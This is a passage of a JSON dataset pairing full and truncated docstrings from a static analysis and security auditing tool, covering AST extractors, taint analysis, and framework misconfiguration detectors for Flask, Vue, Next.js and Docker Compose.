    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Extract slice operations (start:stop:step patterns).\n\n    Detects:\n    - Simple slices: list[1:10]\n    - Step slices: list[::2]\n    - Negative indices: list[-5:]\n    - Slice assignments: list[0:5] = [1, 2, 3]\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of slice dicts:\n        {\n            'line': int,\n            'target': str,  # Variable being sliced\n            'has_start': bool,\n            'has_stop': bool,\n            'has_step': bool,\n            'is_assignment': bool,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract slice operations (start:stop:step patterns).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Extract class attribute mutations (ClassName.x = value, cls.x = value).\n\n    Detects:\n    - Class variable assignment: MyClass.instances = []\n    - cls.x = value in @classmethod\n    - ClassName.attr += 1 (augmented on class)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of class mutation dicts:\n        {\n            'line': int,\n            'class_name': str,  # 'MyClass' or 'cls'\n            'attribute': str,  # 'instances'\n            'operation': 'assignment' | 'augmented_assignment',\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X modifies class state Y\"\n    Experiment design: Monitor ClassName.Y before/after calling X\n    \"\"\"",
    "truncated": "\"\"\"Extract class attribute mutations (ClassName.x = value, cls.x = value).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Extract mutable argument modifications (def foo(lst): lst.append(x)).\n\n    Detects:\n    - def foo(lst): lst.append(x)\n    - def foo(d): d['key'] = value\n    - Any method call on parameter that mutates it\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of argument mutation dicts:\n        {\n            'line': int,\n            'parameter_name': str,  # 'lst'\n            'mutation_type': str,  # 'method_call' | 'item_assignment' | 'attr_assignment' | 'assignment' | 'augmented_assignment'\n            'mutation_detail': str,  # Method name like 'append', 'update', or operation type\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X mutates its arguments\"\n    Experiment design: Pass mutable argument, check state before/after\n    \"\"\"",
    "truncated": "\"\"\"Extract mutable argument modifications (def foo(lst): lst.append(x)).\"\"\""
  },
  {
    "file": "theauditor/context/query.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Search across multiple tables (exploratory analysis).\n\n        Better than Compass's \"semantic search\" because we return EXACT matches\n        from RICH data (TypeScript compiler, not tree-sitter).\n\n        Args:\n            search_term: Term to search for\n            include_tables: Tables to search (default: all major tables)\n            limit: Results per table\n\n        Returns:\n            Dict of results from each table\n\n        Example:\n            # Find everything about payments\n            results = engine.cross_table_search(\"payment\")\n            # Returns: symbols, findings, api_endpoints, etc.\n\n            # Search specific tables\n            results = engine.cross_table_search(\n                \"user\",\n                include_tables=[\"symbols\", \"api_endpoints\", \"findings_consolidated\"]\n            )\n        \"\"\"",
    "truncated": "\"\"\"Search across multiple tables (exploratory analysis).\"\"\""
  },
  {
    "file": "theauditor/fce.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"\n    Load complete taint paths from taint_flows table.\n\n    Queries the dedicated taint_flows table directly instead of parsing JSON\n    from findings_consolidated. This is the authoritative source for taint data.\n\n    Args:\n        db_path: Path to repo_index.db database\n\n    Returns:\n        List of complete taint path dicts with source, intermediate steps, and sink\n\n    Performance:\n        - O(n) where n = number of taint flows\n        - ~5-20ms for 100-1000 paths (indexed query, minimal JSON for path only)\n\n    Data Structure:\n        Each taint path contains:\n        - source: {file, line, pattern}\n        - sink: {file, line, pattern}\n        - path: [{...}, ...] (intermediate steps from path_json)\n        - vulnerability_type: SQL Injection|XSS|Command Injection|etc.\n        - severity: high (all taint paths are high severity)\n    \"\"\"",
    "truncated": "\"\"\"Load complete taint paths from taint_flows table.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript_resolvers.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Resolve handler_file for express_middleware_chains from import statements.\n\n        ADDED 2025-11-27: Phase 6.9 - Cross-file handler file resolution\n\n        Problem:\n            express_middleware_chains stores route definitions in route files,\n            but handlers are defined in controller files. Flow resolver needs\n            handler_file to construct correct DFG node IDs.\n\n            Example:\n                Route file: backend/src/routes/auth.routes.ts\n                Handler expr: authController.adminLogin\n                Handler file: backend/src/controllers/auth.controller.ts\n\n        Algorithm:\n            1. Load middleware chains where handler_file IS NULL\n            2. Parse handler_function to get variable name (AuthController -> authController)\n            3. Look up import that provides that variable\n            4. Resolve module path to actual file path (handle @alias paths)\n            5. Update handler_file column\n\n        Args:\n            db_path: Path to repo_index.db database\n        \"\"\"",
    "truncated": "\"\"\"Resolve handler_file for express_middleware_chains from import statements.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/codegen.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"\nSchema-driven code generation for taint analysis.\n\nThis module auto-generates TypedDicts, accessor classes, memory cache loaders,\nand validation decorators from the schema definitions. This eliminates the\n8-layer manual coding problem and enables schema changes to auto-propagate.\n\nDesign:\n- Generate TypedDict classes for type safety\n- Generate accessor classes with get_all() and get_by_{indexed_column}()\n- Generate SchemaMemoryCache that loads ALL tables automatically\n- Generate validation decorators for runtime checks\n\nUsage:\n    from theauditor.indexer.schemas.codegen import SchemaCodeGenerator\n\n    # Generate all code\n    SchemaCodeGenerator.generate_all()\n\n    # Or generate specific parts\n    typed_dicts = SchemaCodeGenerator.generate_typed_dicts()\n    accessors = SchemaCodeGenerator.generate_accessor_classes()\n    cache = SchemaCodeGenerator.generate_memory_cache()\n\"\"\"",
    "truncated": "\"\"\"Schema-driven code generation for taint analysis.\"\"\""
  },
  {
    "file": "theauditor/indexer/schemas/python_schema.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"\nPython-specific schema definitions.\n\nThis module contains table schemas specific to Python frameworks and patterns:\n- ORM models (SQLAlchemy, Django)\n- HTTP routes (Flask, FastAPI, Django)\n- Validation patterns (Pydantic)\n- Decorators\n- Control flow (loops, branches, exceptions)\n- Security findings (injections, crypto, auth)\n- Testing (fixtures, test cases)\n- Framework configs (Flask, Django, Celery)\n\nDesign Philosophy:\n- Python-only tables\n- Framework-specific extractions\n- Complements core schema with language-specific patterns\n- Domain-grouped consolidated tables with discriminator columns\n\nTABLE HISTORY:\n- 2025-11-25: Reduced from 149 to 8 tables (consolidate-python-orphan-tables)\n- 2025-11-25: Added 20 consolidated tables (wire-extractors-to-consolidated-schema)\n- Current: 28 tables (8 original + 20 consolidated)\n\"\"\"",
    "truncated": "\"\"\"Python-specific schema definitions.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Main engine for applying semantic business logic to findings.\n\n    This class loads user-defined semantic context from YAML files and applies\n    that context to findings from TheAuditor's analysis tools. It classifies\n    findings as obsolete, current, or transitional based on YOUR business logic.\n\n    Example Usage:\n        context = SemanticContext.load('refactoring.yaml')\n        findings = load_findings_from_database()\n        result = context.classify_findings(findings)\n        report = context.generate_report(result)\n        print(report)\n\n    Attributes:\n        context_file: Path to YAML context file\n        context_name: Name of this semantic context\n        description: Human-readable description\n        version: Context version (for tracking changes)\n        obsolete_patterns: List of patterns that are obsolete\n        current_patterns: List of patterns that are current/correct\n        transitional_patterns: List of patterns that are temporarily OK\n        relationships: Semantic relationships between patterns\n        metadata: Additional metadata (author, tags, etc.)\n    \"\"\"",
    "truncated": "\"\"\"Main engine for applying semantic business logic to findings.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/compose_analyze.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Docker Compose Security Analyzer - Database-First Approach.\n\nDetects security misconfigurations in Docker Compose services.\nUses pre-extracted data from compose_services table - NO FILE I/O.\n\nTables Used (guaranteed by schema contract):\n- compose_services: Docker Compose service configurations (17 fields - Phase 3C enhanced)\n\nDetects 11 security issues:\n- Privileged containers\n- Host network mode\n- Docker socket mounting (container escape)\n- Dangerous volume mounts\n- Hardcoded secrets / weak passwords\n- Exposed database/admin ports\n- Vulnerable/unpinned images\n- Root user (Phase 3C)\n- Dangerous capabilities (Phase 3C)\n- Disabled security features (Phase 3C)\n- Command injection risk (Phase 3C)\n- Missing cap_drop (Phase 3C)\n\nSchema Contract Compliance: v1.1+ (Fail-Fast, Uses build_query())\n\"\"\"",
    "truncated": "\"\"\"Docker Compose Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/nextjs_analyze.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Detect Next.js security vulnerabilities using indexed data.\n\n    Detects (from database):\n    - API route secret exposure\n    - Open redirect vulnerabilities\n    - Server-side rendering injection risks\n    - NEXT_PUBLIC sensitive data exposure\n    - Missing CSRF in API routes\n    - Exposed error details in production\n    - Dangerous HTML serialization without sanitization\n    - Missing rate limiting on API routes\n\n    Known Limitations (requires AST/runtime analysis):\n    - Cannot detect \"use server\" directives (string literals not indexed)\n    - Cannot reliably detect Server Actions (Next.js 13+ feature)\n    - Cannot detect middleware order or configuration\n    - Cannot analyze Next.js config files (next.config.js)\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect Next.js security vulnerabilities using indexed data.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/vue_analyze.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"Detect Vue.js security vulnerabilities using indexed data.\n\n    Detects (from database):\n    - v-html directive usage (XSS risk)\n    - Direct innerHTML manipulation\n    - eval() in Vue components\n    - Exposed API keys in frontend\n    - Triple mustache {{{ }}} unescaped interpolation\n    - Dynamic component injection risks\n    - Unsafe target=\"_blank\" links\n    - Direct DOM manipulation bypassing Vue\n\n    Known Limitations (requires AST/template parsing):\n    - Cannot parse .vue SFC template blocks\n    - Cannot detect prop validation structure\n    - Cannot analyze Vue template syntax deeply\n    - Cannot detect computed property side effects\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect Vue.js security vulnerabilities using indexed data.\"\"\""
  },
  {
    "file": "theauditor/rules/typescript/type_safety_analyze.py",
    "line": -1,
    "original_lines": 24,
    "original": "\"\"\"\n    Detect TypeScript type safety issues using semantic type data from TypeScript compiler.\n\n    This enhanced version detects 16 comprehensive patterns:\n    - Explicit and implicit 'any' types (semantic detection via type_annotations)\n    - Missing return types and parameter types (using return_type column)\n    - Unsafe type assertions and non-null assertions\n    - Dangerous type patterns (Function, Object, {})\n    - Untyped API responses and JSON.parse\n    - Missing error handling types\n    - Interface and type definition issues\n    - Unknown types requiring type narrowing (NEW - Pattern 16)\n    - Missing generic type parameters (semantic detection via is_generic)\n    - And much more...\n\n    Uses type_annotations table for 100% accurate semantic detection.\n    NO fallback logic - if table missing, rule crashes (CORRECT behavior per schema contract).\n\n    Args:\n        context: StandardRuleContext with database path\n\n    Returns:\n        List of StandardFinding objects\n    \"\"\"",
    "truncated": "\"\"\"Detect TypeScript type safety issues using semantic type data from TypeScript compiler.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_advanced_extractors.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"\n    Extract Django signal definitions and connections.\n\n    Detects:\n    - django.dispatch.Signal() definitions\n    - signal.connect() calls\n    - Signal subclass definitions\n    - providing_args parameter\n\n    Security relevance:\n    - Signals can trigger privileged operations\n    - Signal receivers may bypass authentication\n    - Signal chains can create TOCTOU vulnerabilities\n\n    Returns:\n        List of dicts with keys:\n        - line: int\n        - signal_name: str\n        - signal_type: str (definition, connection, custom)\n        - providing_args: str (JSON array of argument names)\n        - sender: str (optional - for connections)\n        - receiver_function: str (optional - for connections)\n    \"\"\"",
    "truncated": "\"\"\"Extract Django signal definitions and connections.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"Extract finally blocks that always execute.\n\n    Detects:\n    - finally: cleanup()\n    - Resource cleanup patterns (file.close(), lock.release())\n    - Multiple cleanup calls in finally block\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of finally block dicts:\n        {\n            'line': int,\n            'cleanup_calls': str,  # Comma-separated function names called in finally\n            'has_cleanup': bool,  # True if contains function calls (cleanup logic)\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X always releases lock even on error\"\n    Experiment design: Call X, simulate error, verify lock released in finally\n    \"\"\"",
    "truncated": "\"\"\"Extract finally blocks that always execute.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/flask_extractors.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"Flask framework extractors.\n\nThis module contains extraction logic for Flask web framework patterns:\n- Application factories (create_app pattern)\n- Flask extensions (SQLAlchemy, Login, etc.)\n- Request/response hooks (before_request, after_request)\n- Error handlers (@app.errorhandler)\n- WebSocket handlers (Flask-SocketIO)\n- CLI commands (@click.command)\n- CORS configurations\n- Rate limiting decorators\n- Caching decorators\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Flask framework extractors.\"\"\""
  },
  {
    "file": "theauditor/boundaries/distance.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"Boundary Distance Calculator.\n\nCalculates call-chain distance between entry points and control points\nusing XGraphAnalyzer and graphs.db (which includes interceptor/middleware edges).\n\nDistance Semantics:\n    0 = Control at entry point (PERFECT - validation in function signature)\n    1 = Control in first call (GOOD - validation as first line)\n    2 = Control two calls deep (ACCEPTABLE - validation in service layer)\n    3+ = Control too far (BAD - validation after data has spread)\n    None = No control found (CRITICAL - missing validation entirely)\n\nArchitecture Note:\n    This module uses XGraphAnalyzer (the \"Ferrari\") which reads from graphs.db.\n    graphs.db contains pre-computed call graphs INCLUDING virtual edges from\n    InterceptorStrategy (middleware/decorator connections). This allows boundary\n    analysis to see through Express middleware, Flask decorators, etc.\n\n    Previous implementation used BFS over function_call_args in repo_index.db,\n    which was blind to interceptor edges.\n\nTruth Courier Design: Reports factual distance measurements, not recommendations.\n\"\"\"",
    "truncated": "\"\"\"Boundary Distance Calculator.\"\"\""
  },
  {
    "file": "theauditor/indexer/runner.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"\n    Run the complete repository indexing workflow.\n\n    1. Walk files\n    2. Write manifest\n    3. Create/Migrate DB\n    4. Index content (AST + Extraction)\n\n    Args:\n        root_path: Root directory to index\n        manifest_path: Path to write manifest JSON (relative to root)\n        db_path: Path to SQLite database (relative to root)\n        dry_run: If True, only scan files without creating database\n        follow_symlinks: Whether to follow symbolic links\n        exclude_patterns: Patterns to exclude from indexing\n        print_stats: Whether to print statistics to stdout\n\n    Returns:\n        Dictionary with success status and statistics\n\n    Raises:\n        FileNotFoundError: If root_path does not exist\n    \"\"\"",
    "truncated": "\"\"\"Run the complete repository indexing workflow.\"\"\""
  },
  {
    "file": "theauditor/indexer/schema.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"\n    Build a SELECT query using schema definitions.\n\n    Args:\n        table_name: Name of the table\n        columns: List of column names to select (None = all columns)\n        where: Optional WHERE clause (without 'WHERE' keyword)\n        order_by: Optional ORDER BY clause (without 'ORDER BY' keyword)\n        limit: Optional LIMIT clause (just the number, e.g., 1, 10, 100)\n\n    Returns:\n        Complete SELECT query string\n\n    Example:\n        >>> build_query('variable_usage', ['file', 'line', 'variable_name'])\n        'SELECT file, line, variable_name FROM variable_usage'\n\n        >>> build_query('sql_queries', where=\"command != 'UNKNOWN'\")\n        'SELECT file_path, line_number, query_text, command, tables, extraction_source FROM sql_queries WHERE command != \\\\'UNKNOWN\\\\''\n\n        >>> build_query('symbols', ['name', 'line'], where=\"type = 'function'\", order_by=\"line DESC\", limit=1)\n        'SELECT name, line FROM symbols WHERE type = \\\\'function\\\\' ORDER BY line DESC LIMIT 1'\n    \"\"\"",
    "truncated": "\"\"\"Build a SELECT query using schema definitions.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/__init__.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"Storage layer: Domain-specific handler modules.\n\nThis module provides the DataStorer class that dispatches extracted data\nto domain-specific storage modules (core, python, node, infrastructure).\n\nArchitecture:\n- DataStorer: Main orchestrator, delegates to domain modules\n- BaseStorage: Shared logic (db_manager, counts, _current_extracted)\n- CoreStorage: Language-agnostic handlers (symbols, cfg, assignments)\n- PythonStorage: Python framework handlers (django, flask, pytest)\n- NodeStorage: JavaScript framework handlers (react, vue, angular)\n- InfrastructureStorage: IaC handlers (terraform, cdk, graphql)\n\nDesign Pattern:\n- Handler dispatch via registry dict (data_type -> handler method)\n- Domain modules inherit from BaseStorage\n- DataStorer aggregates all domain handlers into unified registry\n\nUsage:\n    from theauditor.indexer.storage import DataStorer\n    storer = DataStorer(db_manager, counts)\n    storer.store(file_path, extracted, jsx_pass=False)\n\"\"\"",
    "truncated": "\"\"\"Storage layer: Domain-specific handler modules.\"\"\""
  },
  {
    "file": "theauditor/pipelines.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"\n    Run complete audit pipeline in exact order specified in teamsop.md.\n\n    2025 MODERN: Uses RichRenderer for all console output.\n\n    Args:\n        root: Root directory to analyze\n        quiet: Whether to run in quiet mode (minimal output)\n        exclude_self: Whether to exclude TheAuditor's own files from analysis\n        offline: Whether to skip network operations (deps, docs)\n        use_subprocess_for_taint: Whether to run taint analysis as subprocess (slower)\n        wipe_cache: Whether to delete caches before run (for corruption recovery)\n        index_only: Whether to run only Stage 1+2 (indexing) and skip heavy analysis\n\n    Returns:\n        Dict containing:\n            - success: Whether all phases succeeded\n            - failed_phases: Number of failed phases\n            - total_phases: Total number of phases\n            - elapsed_time: Total execution time in seconds\n            - created_files: List of all created files\n            - log_lines: List of all log lines\n    \"\"\"",
    "truncated": "\"\"\"Run complete audit pipeline in exact order specified in teamsop.md.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/flask_analyze.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"Detect Flask security misconfigurations.\n\n    Analyzes database for:\n    - Server-Side Template Injection (SSTI)\n    - XSS via Markup()\n    - Debug mode enabled\n    - Hardcoded secret keys\n    - Unsafe file uploads\n    - SQL injection risks\n    - Open redirect vulnerabilities\n    - Eval usage with user input\n    - CORS wildcard configuration\n    - Unsafe deserialization\n    - Werkzeug debugger exposure\n    - Missing CSRF protection\n    - Session cookie security\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of StandardFinding objects for detected issues\n    \"\"\"",
    "truncated": "\"\"\"Detect Flask security misconfigurations.\"\"\""
  },
  {
    "file": "theauditor/taint/ifds_analyzer.py",
    "line": -1,
    "original_lines": 23,
    "original": "\"\"\"IFDS-based taint analyzer using pre-computed graphs.\n\nThis module implements demand-driven backward taint analysis using the IFDS\nframework adapted from \"IFDS Taint Analysis with Access Paths\" (Allen et al., 2021).\n\nKey differences from paper:\n- Uses pre-computed graphs.db instead of on-the-fly graph construction\n- Database-first (no SSA/φ-nodes, works with normalized AST data)\n- Multi-language (Python, JS, TS via extractors)\n\nArchitecture (Phase 6.1 - Goal B: Full Provenance):\n    Sources → [Backward IFDS] → Sinks\n              ↓\n    graphs.db (DFG + Call Graph)\n              ↓\n    8-10 hop cross-file flows (COMPLETE call chain)\n\nCRITICAL: Source matches are WAYPOINTS, not termination points.\nPaths are recorded ONLY at max_depth or natural termination.\nThis captures the full call chain: route → middleware → controller → service → ORM\n\nPerformance: O(CallD³ + 2ED²) - h-sparse IFDS (page 10, Table 3)\n\"\"\"",
    "truncated": "\"\"\"IFDS-based taint analyzer using pre-computed graphs.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/js_helper_templates.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Read pre-compiled extractor bundle.\n\n    Reads the esbuild output from javascript/dist/extractor.js.\n    The bundle contains all extraction logic compiled from TypeScript sources.\n\n    Args:\n        module_type: Ignored - bundle is always ESM/IIFE compatible for Node.\n                     Kept for backward compatibility with callers.\n\n    Returns:\n        Complete JavaScript extractor bundle as a string\n\n    Raises:\n        FileNotFoundError: If the bundle is missing (needs npm run build)\n\n    Example:\n        >>> script = get_batch_helper()\n        >>> # Write to temp file and execute\n        >>> temp_path = Path(tempfile.mktemp(suffix='.mjs'))\n        >>> temp_path.write_text(script)\n        >>> subprocess.run(['node', str(temp_path), ...])\n    \"\"\"",
    "truncated": "\"\"\"Read pre-compiled extractor bundle.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cdk_extractor.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Check if an ast.Call node represents a CDK construct instantiation.\n\n    Detects patterns like:\n    - s3.Bucket(self, \"MyBucket\", ...)\n    - ec2.SecurityGroup(self, \"MySG\", ...)\n    - aws_cdk.aws_s3.Bucket(self, \"MyBucket\", ...)\n    - rds.DatabaseInstance(self, \"MyDB\", ...)\n\n    CDK constructs MUST have:\n    1. At least 2 positional arguments (scope, id, ...)\n    2. Second argument must be a string literal (construct ID)\n\n    This excludes factory methods like:\n    - ec2.InstanceType.of(...) - No string ID argument\n    - s3.BucketEncryption.S3_MANAGED - Property access, not a constructor\n\n    Args:\n        node: AST Call node to check\n\n    Returns:\n        True if this appears to be a CDK construct call\n    \"\"\"",
    "truncated": "\"\"\"Check if an ast.Call node represents a CDK construct instantiation.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract for loop patterns with enumerate, zip, else clause detection.\n\n    Detects:\n    - enumerate() patterns\n    - zip() patterns\n    - range() patterns\n    - .items(), .values(), .keys() patterns\n    - else clause\n    - Nesting level\n    - Target count (unpacking)\n\n    Returns:\n        List of for loop dicts:\n        {\n            'line': int,\n            'loop_type': str,  # 'enumerate' | 'zip' | 'range' | 'items' | 'values' | 'keys' | 'plain'\n            'has_else': bool,\n            'nesting_level': int,\n            'target_count': int,\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract for loop patterns with enumerate, zip, else clause detection.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/control_flow_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract import statement patterns.\n\n    Detects:\n    - Import type (import, from, relative)\n    - Module name\n    - Aliases\n    - Wildcard imports\n    - Relative import level\n\n    Returns:\n        List of import statement dicts:\n        {\n            'line': int,\n            'import_type': str,  # 'import' | 'from' | 'relative'\n            'module': str,\n            'has_alias': bool,\n            'is_wildcard': bool,\n            'relative_level': int,\n            'imported_names': str,  # Comma-separated\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract import statement patterns.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/data_flow_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract nonlocal variable modifications.\n\n    Detects:\n    - nonlocal x; x = value (write)\n    - nonlocal x; ... usage of x (read)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of nonlocal access dicts:\n        {\n            'line': int,\n            'variable_name': str,  # Nonlocal variable name\n            'access_type': str,  # 'read' | 'write'\n            'in_function': str,  # Function containing nonlocal declaration\n        }\n\n    Enables hypothesis: \"Nested function X modifies outer variable Y\"\n    Experiment design: Call X, verify outer Y value changed\n    \"\"\"",
    "truncated": "\"\"\"Extract nonlocal variable modifications.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_advanced_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\n    Extract Django @receiver decorators.\n\n    Detects:\n    - @receiver(signal_name) decorators\n    - Multiple signals in one decorator\n    - sender parameter\n\n    Security relevance:\n    - Receivers can bypass normal authentication flow\n    - Receivers may have elevated privileges\n    - Race conditions in signal handlers\n    - TOCTOU between signal and receiver\n\n    Returns:\n        List of dicts with keys:\n        - line: int\n        - function_name: str\n        - signals: str (JSON array of signal names)\n        - sender: str (optional)\n        - is_weak: bool (weak=True/False parameter)\n    \"\"\"",
    "truncated": "\"\"\"Extract Django @receiver decorators.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/django_advanced_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"\n    Extract Django custom manager definitions.\n\n    Detects:\n    - models.Manager subclasses\n    - Custom manager methods\n    - .objects assignments in models\n    - Multiple managers per model\n\n    Security relevance:\n    - Custom managers can bypass row-level security\n    - Manager methods may not respect permissions\n    - Queryset filtering can be security boundary\n\n    Returns:\n        List of dicts with keys:\n        - line: int\n        - manager_name: str\n        - base_class: str (Manager, BaseManager, etc.)\n        - custom_methods: str (JSON array of method names)\n        - model_assignment: str (Model.objects = ManagerName())\n    \"\"\"",
    "truncated": "\"\"\"Extract Django custom manager definitions.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract None handling patterns (is None vs == None).\n\n    Detects:\n    - None checks: if x is None\n    - None assignments: x = None\n    - None defaults: def func(x=None)\n    - None returns: return None\n    - Incorrect comparisons: x == None (should use 'is')\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of None pattern dicts:\n        {\n            'line': int,\n            'pattern': str,  # 'is_none_check' | 'none_assignment' | 'none_default' | 'none_return'\n            'uses_is': bool,  # True if uses 'is None' (correct)\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract None handling patterns (is None vs == None).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract string formatting patterns (f-strings, %, format()).\n\n    Detects:\n    - F-strings: f\"Hello {name}\"\n    - %-formatting: \"Hello %s\" % name\n    - .format(): \"Hello {}\".format(name)\n    - Template strings: Template(\"Hello $name\")\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of string formatting dicts:\n        {\n            'line': int,\n            'format_type': str,  # 'f_string' | 'percent' | 'format_method' | 'template'\n            'has_expressions': bool,  # True if has expressions (f\"{x + 1}\")\n            'var_count': int,  # Number of interpolated variables\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract string formatting patterns (f-strings, %, format()).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/operator_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract all operator usage (arithmetic, comparison, logical, bitwise).\n\n    Detects:\n    - Arithmetic: +, -, *, /, //, %, **\n    - Comparison: <, >, <=, >=, ==, !=\n    - Logical: and, or, not\n    - Bitwise: &, |, ^, ~, <<, >>\n    - Matrix multiplication: @\n\n    Args:\n        tree: AST tree dictionary\n        parser_self: Parser instance (unused)\n\n    Returns:\n        List of operator dicts:\n        {\n            'line': int,\n            'operator_type': str,  # 'arithmetic' | 'comparison' | 'logical' | 'bitwise' | 'unary'\n            'operator': str,  # The actual operator symbol\n            'in_function': str,\n        }\n    \"\"\"",
    "truncated": "\"\"\"Extract all operator usage (arithmetic, comparison, logical, bitwise).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/security_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Python security pattern extractors - OWASP Top 10 focus.\n\nThis module contains extraction logic for security-critical patterns:\n- Authentication decorators\n- Password hashing\n- JWT operations\n- SQL injection patterns\n- Command injection\n- Path traversal\n- Dangerous eval/exec\n- Cryptography operations\n\nARCHITECTURAL CONTRACT: File Path Responsibility\n=================================================\nAll functions here:\n- RECEIVE: AST tree only (no file path context)\n- EXTRACT: Data with 'line' numbers and content\n- RETURN: List[Dict] with keys like 'line', 'name', 'type', etc.\n- MUST NOT: Include 'file' or 'file_path' keys in returned dicts\n\nFile path context is provided by the INDEXER layer when storing to database.\n\"\"\"",
    "truncated": "\"\"\"Python security pattern extractors - OWASP Top 10 focus.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/state_mutation_extractors.py",
    "line": -1,
    "original_lines": 22,
    "original": "\"\"\"Extract global variable mutations (global x; x = value).\n\n    Detects:\n    - global statement followed by assignment\n    - Module-level variable reassignment (tracked via scoping)\n\n    Args:\n        tree: AST tree dictionary with 'tree' containing the actual AST\n        parser_self: Reference to parser instance (unused but follows pattern)\n\n    Returns:\n        List of global mutation dicts:\n        {\n            'line': int,\n            'global_name': str,  # '_cache'\n            'operation': 'assignment' | 'augmented_assignment' | 'item_assignment' | 'attr_assignment',\n            'in_function': str,\n        }\n\n    Enables hypothesis: \"Function X has global side effects\"\n    Experiment design: Monitor global variable before/after calling X\n    \"\"\"",
